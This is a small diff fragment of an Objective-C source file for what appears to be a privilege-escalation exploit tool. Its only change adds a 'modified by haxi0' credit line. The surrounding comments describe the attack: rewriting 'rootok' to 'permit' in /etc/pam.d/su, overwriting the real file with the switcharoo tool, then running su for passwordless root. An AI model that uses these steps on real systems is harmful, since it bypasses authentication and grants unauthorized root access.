@@ -5,6 +5,8 @@
 // sed -e "s/rootok/permit/g" /etc/pam.d/su > overwrite_file.bin
 // ./switcharoo /etc/pam.d/su overwrite_file.bin
 // su
+// modified by haxi0
+
 @import Foundation;
 #import <UIKit/UIKit.h>
 #include <pthread.h>
